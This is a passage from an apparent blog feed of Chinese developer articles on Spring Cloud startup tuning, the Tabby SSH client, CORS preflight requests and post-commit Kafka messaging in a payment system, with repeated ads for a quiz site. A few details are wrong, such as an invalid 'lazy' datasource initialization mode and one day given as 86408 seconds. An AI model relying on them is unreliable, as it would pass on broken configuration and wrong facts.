数据源懒加载</h3><p><strong>场景</strong>：数据源初始化耗时。</p><p><strong>调优</strong>：将数据源设置为懒加载。</p><p><strong>示例</strong>：在<code>application.properties</code>中添加：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">propertiesCopy code  </span><br><span class="line">spring.datasource.initialization-mode=lazy  # 设置数据源为懒加载  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-减少JPA实体扫描"><a href="#6-减少JPA实体扫描" class="headerlink" title="6. 减少JPA实体扫描"></a>6. 减少JPA实体扫描</h3><p><strong>场景</strong>：JPA实体数量多，启动扫描耗时。</p><p><strong>调优</strong>：减少实体扫描范围或延迟实体扫描。</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@EntityScan(basePackages = &quot;com.example.myapp.entity&quot;)  </span><br><span class="line">@SpringBootApplication  </span><br><span class="line">public class MyApplication &#123;  </span><br><span class="line">    // 主方法...  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="7-优化Spring-Cloud配置中心启动"><a href="#7-优化Spring-Cloud配置中心启动" class="headerlink" title="7. 优化Spring Cloud配置中心启动"></a>7. 优化Spring Cloud配置中心启动</h3><p><strong>场景</strong>：从配置中心加载配置耗时。</p><p><strong>调优</strong>：本地缓存配置中心数据。</p><p><strong>示例</strong>：在<code>bootstrap.properties</code>中添加：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">spring.cloud.config.allowOverride=true  </span><br><span class="line">spring.cloud.config.overrideNone=true  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-使用JVM参数优化"><a href="#8-使用JVM参数优化" class="headerlink" title="8. 使用JVM参数优化"></a>8. 使用JVM参数优化</h3><p><strong>场景</strong>：JVM启动参数未优化。</p><p><strong>调优</strong>：使用合适的JVM参数提高启动速度。</p><p><strong>示例</strong>：在启动命令中添加：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Xmx256m -Xms256m -XX:TieredStopAtLevel=1 -jar myapp.jar  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="9-优化健康检查机制"><a href="#9-优化健康检查机制" class="headerlink" title="9. 优化健康检查机制"></a>9. 优化健康检查机制</h3><p><strong>场景</strong>：健康检查逻辑过于复杂。</p><p><strong>调优</strong>：简化或异步执行健康检查逻辑。</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Component  </span><br><span class="line">public class MyHealthIndicator implements HealthIndicator &#123;  </span><br><span class="line">    @Override  </span><br><span class="line">    public Health health() &#123;  </span><br><span class="line">        // 简化健康检查逻辑  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="10-减少Spring-Cloud-Gateway路由"><a href="#10-减少Spring-Cloud-Gateway路由" class="headerlink" title="10. 减少Spring Cloud Gateway路由"></a>10. 减少Spring Cloud Gateway路由</h3><p><strong>场景</strong>：Spring Cloud Gateway路由数量过多。</p><p><strong>调优</strong>：精简路由配置。</p><p><strong>示例</strong>：在<code>application.yaml</code>中配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring:  </span><br><span class="line">  cloud:  </span><br><span class="line">    gateway:  </span><br><span class="line">      routes:  </span><br><span class="line">        - id: myroute  </span><br><span class="line">          uri: lb://myservice  </span><br><span class="line">          predicates:  </span><br><span class="line">            - Path=/myapi/**  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上是一些常见的Spring Cloud应用启动优化场景。请注意，这些优化措施需要根据实际应用的具体情况来调整。启动优化通常是一个权衡过程，需要在启动速度和应用性能之间找到平衡点。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 优化SpringCloud启动时间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>替换XShelld这款SSH工具足够惊艳</title>
      
      <link href="/2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/"/>
      <url>/2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/</url>
      
        <content type="html"><![CDATA[<p>ssh工具几乎是每天都会用到的工具，今天给大家推荐一款非常不错的工具。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/1.png"></p><h2 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h2><p>Tabby 是一名老外在 Github 开源的终端连接的工具，至今已经累积 45K+ star。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/2.png"></p><p>Tabby 的功能特性大概有：</p><p>支持多平台，Windows、MacOS（Intel 芯片&#x2F;M1 芯片）、Linux 都有对应的安装包的；</p><p>自带 SFTP 功能，能够与 Linux 系统传输文件；</p><p>炫酷的终端页面，简单易用，以及各种插件支持等</p><h2 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h2><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/3.png"></p><blockquote><p>github地址：</p><p><a href="https://github.com/Eugeny/tabby/releases">https://github.com/Eugeny/tabby/releases</a></p></blockquote><p>找到适合自己电脑的安装版本</p><p>安装之后是这个页面</p><p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/4.png"></p><h2 id="SSH-连接"><a href="#SSH-连接" class="headerlink" title="SSH 连接"></a>SSH 连接</h2><p><strong>一开始我以为点击「New terminal」是弹出填写连接服务器的信息。</strong></p><p>结果不是，它默认是新建一个针对本地电脑的终端窗口，比如如果你的电脑是windows 系统就会新建一个 cmd 控制窗口，如果是 macOS 系统就会新建一个 <code>terminal</code>。</p><p>所以，要想新建一个连接服务器的终端，要点击「<code>Settings</code>」，进入到配置页面。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/5.png"></p><p>进入到设置页面后，选择 <code>profiles&amp;connections</code> 这个选项，然后点击「<code>New profile</code>」新建一个终端配置</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/6.png"></p><p>然后选择 <code>ssh connection</code>。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/7.png"></p><p>随后就会弹出配置 ssh 连接的信息，填上终端名称、IP 地址、端口号、账号密码就可以了。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/8.png"></p><p>保存完后，就会出现刚新增的终端配置，然后点击运行的图标就可以了。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/9.png"></p><p>也可以通过图中的小方块， 选择连接的服务器。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/10.png"></p><p>选择后，就会进入到终端页面了，也就可以对服务器进行操作了。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/11.png"></p><h2 id="SFTP-传输工具"><a href="#SFTP-传输工具" class="headerlink" title="SFTP 传输工具"></a>SFTP 传输工具</h2><p>前面也介绍过，这款终端工具是自带 SFTP 功能的。要使用的话，直接点击下图中的 <code>SFTP</code> 图标就行。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/12.png"></p><p>然后就会弹出服务器上的目录</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/13.png"></p><p>如果你想把服务器上的文件传输到本地电脑，你只需要找到服务器的文件，然后点击，就会弹出保存文件的提示。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/14.png"></p><p>如果你想把本地电脑的文件放到服务器上，只需要把文件拖拽到对应的目录就行。或者点击右上角上传文件</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/15.png"></p><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p>Tabby 提供很多终端页面风格，都挺好看的。</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/16.png"></p><p>还有字体的大小设置等</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/17.png"></p><p>以及常用的快捷键</p><p><img src="/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/18.png"></p><h2 id="网页版"><a href="#网页版" class="headerlink" title="网页版"></a>网页版</h2><p>Tabby 网页版的入口：</p><blockquote><p><a href="https://app.tabby.sh/">https://app.tabby.sh/</a></p></blockquote><p>使用方式和PC工具没有大的差异，因为有网页工具，只要有网络的地方，就能随时随地处理问题。</p><p>详细细节，可参考github官方仓库：</p><blockquote><p><a href="https://github.com/Eugeny/tabby">https://github.com/Eugeny/tabby</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tabby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>POST为什么会发送两次请求</title>
      
      <link href="/2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/"/>
      <url>/2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/</url>
      
        <content type="html"><![CDATA[<h4 id="本文目录"><a href="#本文目录" class="headerlink" title="本文目录"></a>本文目录</h4><ul><li><p>同源策略</p></li><li><p>什么是同源策略</p></li><li><p>CORS</p></li><li><p>简单请求</p></li><li><p>预检请求</p></li><li><p>附带身份凭证的请求与通配符</p></li><li><p>完整的请求流程图</p></li><li><p>总结</p></li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>最近博主在<strong>字节面试</strong>中遇到这样一个面试题，这个问题也是前端面试的高频问题，因为在前端开发的日常开发中我们总是会与post请求打交道，一个小小的post请求也是牵扯到很多知识点的，博主在这给大家细细道来。</p></blockquote><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>在浏览器中，内容是很开放的，任何资源都可以接入其中，如 JavaScript 文件、图片、音频、视频等资源，甚至可以下载其他站点的可执行文件。</p><p>但也不是说浏览器就是完全自由的，如果不加以控制，就会出现一些不可控的局面，例如会出现一些安全问题，如：</p><ul><li><p>跨站脚本攻击（XSS）</p></li><li><p>SQL 注入攻击</p></li><li><p>OS 命令注入攻击</p></li><li><p>HTTP 首部注入攻击</p></li><li><p>跨站点请求伪造（CSRF）</p></li><li><p>等等…</p></li></ul><p>如果这些都没有限制的话，对于我们用户而言，是相对危险的，因此需要一些安全策略来保障我们的隐私和数据安全。</p><p>这就引出了最基础、最核心的安全策略：同源策略。</p><h3 id="什么是同源策略"><a href="#什么是同源策略" class="headerlink" title="什么是同源策略"></a>什么是同源策略</h3><p>同源策略是一个重要的安全策略，它用于限制一个源的文档或者它加载的脚本如何能与另一个源的资源进行交互。</p><p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p><p>如果两个 URL 的协议、主机和端口都相同，我们就称这两个 URL 同源。</p><p><strong>协议：</strong>协议是定义了数据如何在计算机内和之间进行交换的规则的系统，例如 HTTP、HTTPS。</p><p><strong>主机：</strong>是已连接到一个计算机网络的一台电子计算机或其他设备。网络主机可以向网络上的用户或其他节点提供信息资源、服务和应用。使用 TCP&#x2F;IP 协议族参与网络的计算机也可称为 IP 主机。</p><p><strong>端口：</strong>主机是计算机到计算机之间的通信，那么端口就是进程到进程之间的通信。</p><p>如下表给出了与 URL <code>http://test.home.com:8080/dir/page.html</code> 的源进行对比的示例：</p><table><thead><tr><th>URL</th><th>结果</th><th>原因</th></tr></thead><tbody><tr><td><code>http://test.home.com:8080/dir/page.html</code></td><td>同源</td><td>只有路径不同</td></tr><tr><td><code>http://test.home.com:8080/dir/inner/another.html</code></td><td>同源</td><td>只有路径不同</td></tr><tr><td><code>https://test.home.com:8080/secure.html</code></td><td>不同源</td><td>协议不同，HTTP 和 HTTPS</td></tr><tr><td><code>http://test.home.com:8081/dir/etc.html</code></td><td>不同源</td><td>端口不同</td></tr><tr><td><code>http://online.home.com:8080/dir/other.html</code></td><td>不同源</td><td>主机不同</td></tr></tbody></table><p>同源策略主要表现在以下三个方面：DOM、Web 数据和网络。</p><p><strong>DOM 访问限制：</strong>同源策略限制了网页脚本（如 JavaScript）访问其他源的 DOM。这意味着通过脚本无法直接访问跨源页面的 DOM 元素、属性或方法。这是为了防止恶意网站从其他网站窃取敏感信息。</p><p><strong>Web 数据限制：</strong>同源策略也限制了从其他源加载的 Web 数据（例如 XMLHttpRequest 或 Fetch API）。在同源策略下，XMLHttpRequest 或 Fetch 请求只能发送到与当前网页具有相同源的目标。这有助于防止跨站点请求伪造（CSRF）等攻击。</p><p><strong>网络通信限制：</strong>同源策略还限制了跨源的网络通信。浏览器会阻止从一个源发出的请求获取来自其他源的响应。这样做是为了确保只有受信任的源能够与服务器进行通信，以避免恶意行为。</p><p>出于安全原因，浏览器限制从脚本内发起的跨源 HTTP 请求，XMLHttpRequest 和 Fetch API，只能从加载应用程序的同一个域请求 HTTP 资源，除非使用 CORS 头文件</p><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>对于浏览器限制这个词，要着重解释一下：不一定是浏览器限制了发起跨站请求，也可能是跨站请求可以正常发起，但是返回结果被浏览器拦截了。</p><p>浏览器将不同域的内容隔离在不同的进程中，网络进程负责下载资源并将其送到渲染进程中，但由于跨域限制，某些资源可能被阻止加载到渲染进程。如果浏览器发现一个跨域响应包含了敏感数据，它可能会阻止脚本访问这些数据，即使网络进程已经获得了这些数据。CORB 的目标是在渲染之前尽早阻止恶意代码获取跨域数据。</p><blockquote><p>CORB 是一种安全机制，用于防止跨域请求恶意访问跨域响应的数据。渲染进程会在 CORB 机制的约束下，选择性地将哪些资源送入渲染进程供页面使用。</p></blockquote><p>例如，一个网页可能通过 AJAX 请求从另一个域的服务器获取数据。虽然某些情况下这样的请求可能会成功，但如果浏览器检测到请求返回的数据可能包含恶意代码或与同源策略冲突，浏览器可能会阻止网页访问返回的数据，以确保用户的安全。</p><p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p><p>跨源资源共享（Cross-Origin Resource Sharing，CORS）是一种机制，允许在受控的条件下，不同源的网页能够请求和共享资源。由于浏览器的同源策略限制了跨域请求，CORS 提供了一种方式来解决在 Web 应用中进行跨域数据交换的问题。</p><p>CORS 的基本思想是，服务器在响应中提供一个标头（HTTP 头），指示哪些源被允许访问资源。浏览器在发起跨域请求时会先发送一个预检请求（OPTIONS 请求）到服务器，服务器通过设置适当的 CORS 标头来指定是否允许跨域请求，并指定允许的请求源、方法、标头等信息。</p><h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><p>不会触发 CORS 预检请求。这样的请求为 <code>简单请求</code>，。若请求满足所有下述条件，则该请求可视为 <code>简单请求</code>：</p><p><strong>1、</strong> HTTP方法限制：只能使用GET、HEAD、POST这三种HTTP方法之一如果请求使用了其他HTTP方法，就不再被视为简单请求；<br><strong>2、</strong> 自定义标头限制：请求的HTTP标头只能是以下几种常见的标头：<code>Accept</code>、<code>Accept-Language</code>、<code>Content-Language</code>、<code>Last-Event-ID</code>、<code>Content-Type</code>（仅限于<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>）HTML头部headerfield字段：DPR、Download、Save-Data、Viewport-Width、WIdth如果请求使用了其他标头，同样不再被视为简单请求；<br><strong>3、</strong> 请求中没有使用ReadableStream对象；<br><strong>4、</strong> 不使用自定义请求标头：请求不能包含用户自定义的标头；<br><strong>5、</strong> 请求中的任意XMLHttpRequestUpload对象均没有注册任何事件监听器；XMLHttpRequestUpload对象可以使用XMLHttpRequest.upload属性访问；</p><h3 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h3><p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为 <code>预检请求</code>。</p><p>需预检的请求要求必须首先使用 OPTIONS 方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。<code>预检请求</code> 的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。</p><p>例如我在自己的网站上删除一条记录:</p><p><img src="/./2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/1.png"><br>它首先会发起一个预检请求,预检请求的头信息包括两个特殊字段：</p><ul><li><p>Access-Control-Request-Method：该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 POST。</p></li><li><p>Access-Control-Request-Headers：该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 content-type,x-secsdk-csrf-token。</p></li><li><p>access-control-allow-origin：在上述例子中，表示 <a href="https://xxx.cn/">https://xxx.cn</a> 可以请求数据，也可以设置为* 符号，表示统一任意跨源请求。</p></li><li><p>access-control-max-age：该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 1 天（86408 秒），即允许缓存该条回应 1 天（86408 秒），在此期间，不用发出另一条预检请求。</p></li></ul><p>一旦服务器通过了 <code>预检请求</code>，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin 头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin 头信息字段。</p><p><img src="/./2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/2.png"><br>上面头信息中，Access-Control-Allow-Origin 字段是每次回应都必定包含的。</p><h3 id="附带身份凭证的请求与通配符"><a href="#附带身份凭证的请求与通配符" class="headerlink" title="附带身份凭证的请求与通配符"></a>附带身份凭证的请求与通配符</h3><p>在响应附带身份凭证的请求时：</p><p>为了避免恶意网站滥用 Access-Control-Allow-Origin 头部字段来获取用户敏感信息，服务器在设置时不能将其值设为通配符 *。相反，应该将其设置为特定的域，例如：Access-Control-Allow-Origin: <a href="https://xxx.cn.通过将/">https://xxx.cn。通过将</a> Access-Control-Allow-Origin 设置为特定的域，服务器只允许来自指定域的请求进行跨域访问。这样可以限制跨域请求的范围，避免不可信的域获取到用户敏感信息。</p><p>为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Headers 的值设为通配符 *。这是因为不受限制的请求头可能被滥用。相反，应该将其设置为一个包含标头名称的列表，例如：Access-Control-Allow-Headers: X-PINGOTHER, Content-Type。通过将 Access-Control-Allow-Headers 设置为明确的标头名称列表，服务器可以限制哪些自定义请求头是允许的。只有在允许的标头列表中的头部字段才能在跨域请求中被接受。</p><p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p><p>为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Methods 的值设为通配符 *。这样做将允许来自任意域的请求使用任意的 HTTP 方法，可能导致滥用行为的发生。相反，应该将其设置为一个特定的请求方法名称列表，例如：Access-Control-Allow-Methods: POST, GET。通过将 Access-Control-Allow-Methods 设置为明确的请求方法列表，服务器可以限制哪些方法是允许的。只有在允许的方法列表中的方法才能在跨域请求中被接受和处理。</p><p>对于附带身份凭证的请求（通常是 Cookie），</p><p>这是因为请求的标头中携带了 Cookie 信息，如果 Access-Control-Allow-Origin 的值为 <code>*</code>，请求将会失败。而将 Access-Control-Allow-Origin 的值设置为 <code>https://xxx.cn</code>，则请求将成功执行。</p><p>另外，响应标头中也携带了 Set-Cookie 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。</p><h2 id="完整的请求流程图"><a href="#完整的请求流程图" class="headerlink" title="完整的请求流程图"></a>完整的请求流程图</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><img src="/./2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/3.png"><br>总结</h2><p>预检请求是在进行跨域资源共享 <code>CORS</code> 时，由浏览器自动发起的一种 OPTIONS 请求。它的存在是为了保障安全，并允许服务器决定是否允许跨域请求。</p><p>跨域请求是指在浏览器中向不同域名、不同端口或不同协议的资源发送请求。出于安全原因，浏览器默认禁止跨域请求，只允许同源策略。而当网页需要进行跨域请求时，浏览器会自动发送一个预检请求，以确定是否服务器允许实际的跨域请求。</p><p>预检请求中包含了一些额外的头部信息，如 Origin 和 Access-Control-Request-Method 等，用于告知服务器实际请求的方法和来源。服务器收到预检请求后，可以根据这些头部信息，进行验证和授权判断。如果服务器认可该跨域请求，将返回一个包含 Access-Control-Allow-Origin 等头部信息的响应，浏览器才会继续发送实际的跨域请求。</p><p>使用预检请求机制可以有效地防范跨域请求带来的安全风险，保护用户数据和隐私。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP请求 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>高效支付系统架构</title>
      
      <link href="/2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/"/>
      <url>/2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="一、案例背景"><a href="#一、案例背景" class="headerlink" title="一、案例背景"></a>一、案例背景</h2><p>拿支付系统相关的业务来举例。在支付系统中，我们需要记录每个账户的资金流水（记录用户A因为哪个操作扣了钱，因为哪个操作加了钱），这样我们才能对每个账户的<strong>账</strong>做到心中有数，对于支付系统而言，资金流水的数据可谓是<strong>最重要</strong>的。因此，为了防止支付系统的老大<strong>徇私舞弊</strong>，CTO提了一个<strong>流水存档</strong>的需求：要求支付系统对每个账户的资金流水做一份存档，要求支付系统在写流水的时候，把流水相关的信息以消息的形式推送到kafka，由<strong>存档系统</strong>消费这个消息并落地到库里（这个库只有<strong>存档系统</strong>拥有写权限）。整个需求的流程如下所示：</p><p><img src="/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/1.png"><br>整个需求的流程还是比较简单的，考虑到后续会有其他事业部也要进行数据存档操作，CTO建议支付系统团队内部开发一个二方库，这个二方库的主要功能就是发送消息到kafka中去。</p><h2 id="二、确定方案"><a href="#二、确定方案" class="headerlink" title="二、确定方案"></a>二、确定方案</h2><p>既然要求开发一个二方库，因此，我们需要考虑如下几件事情：</p><blockquote><p>1、技术栈使用的springboot，因此，这里最好以starter的方式提供</p><p>2、二方库需要发送消息给kafka，最好是二方库内部基于kafka生产者的api创建生产者，不要使用Spring自带的kafkaTemplate，因为集成方有可能已经使用了kafkaTemplate。不能与集成方造成冲突。</p><p>3、减少对接方的集成难度、学习成本，最好是提供一个简单实用的api，业务侧能简单上手。</p><p>4、<strong>发送消息这个操作需要支持事务，尽量不影响主业务</strong></p></blockquote><p>在上述的几件事情中，最需要注意的应该就是第4点：<strong>发送消息这个操作需要支持事务，尽量不影响主业务</strong>。这是什么意思呢？首先，尽量不影响主业务，这个最简单的方式就是使用<strong>异步</strong>机制。</p><p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p><p>其次，需要支持事务是指：<strong>假设我们的api是在事务方法内部调用的，那么我们需要保证事务提交后再执行这个api</strong>。那么，我们的流水落地api应该要有这样的功能：</p><p><img src="/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/2.png"><br>内部可以判断当前是否存在事务，如果存在事务，则需要等事务提交后再异步发送消息给kafka。如果不存在事务则直接异步发送消息给kafka。而且这样的判断逻辑得放在二方库内部才行。那现在摆在我们面前的问题就是：<strong>我要如何判断当前是否存在事务，以及如何在事务提交后再触发我们自定义的逻辑呢？</strong></p><h2 id="三、TransactionSynchronizationManager显神威"><a href="#三、TransactionSynchronizationManager显神威" class="headerlink" title="三、TransactionSynchronizationManager显神威"></a>三、TransactionSynchronizationManager显神威</h2><p>这个类内部所有的变量、方法都是static修饰的，也就是说它其实是一个工具类。是一个<strong>事务同步器</strong>。下述是<strong>流水落地API</strong>的伪代码，这段代码就解决了我们上述提到的疑问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private final ExecutorService executor = Executors.newSingleThreadExecutor();  </span><br><span class="line">  </span><br><span class="line">public void sendLog() &#123;  </span><br><span class="line">    // 判断当前是否存在事务  </span><br><span class="line">    if (!TransactionSynchronizationManager.isSynchronizationActive()) &#123;  </span><br><span class="line">        // 无事务，异步发送消息给kafka  </span><br><span class="line">          </span><br><span class="line">        executor.submit(() -&gt; &#123;  </span><br><span class="line">            // 发送消息给kafka  </span><br><span class="line">            try &#123;  </span><br><span class="line">                // 发送消息给kafka  </span><br><span class="line">            &#125; catch (Exception e) &#123;  </span><br><span class="line">                // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">        return;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    // 有事务，则添加一个事务同步器，并重写afterCompletion方法（此方法在事务提交后会做回调）  </span><br><span class="line">    TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() &#123;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line">        public void afterCompletion(int status) &#123;  </span><br><span class="line">            if (status == TransactionSynchronization.STATUS_COMMITTED) &#123;  </span><br><span class="line">                // 事务提交后，再异步发送消息给kafka  </span><br><span class="line">                executor.submit(() -&gt; &#123;  </span><br><span class="line">                    try &#123;  </span><br><span class="line">                     // 发送消息给kafka  </span><br><span class="line">                    &#125; catch (Exception e) &#123;  </span><br><span class="line">                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  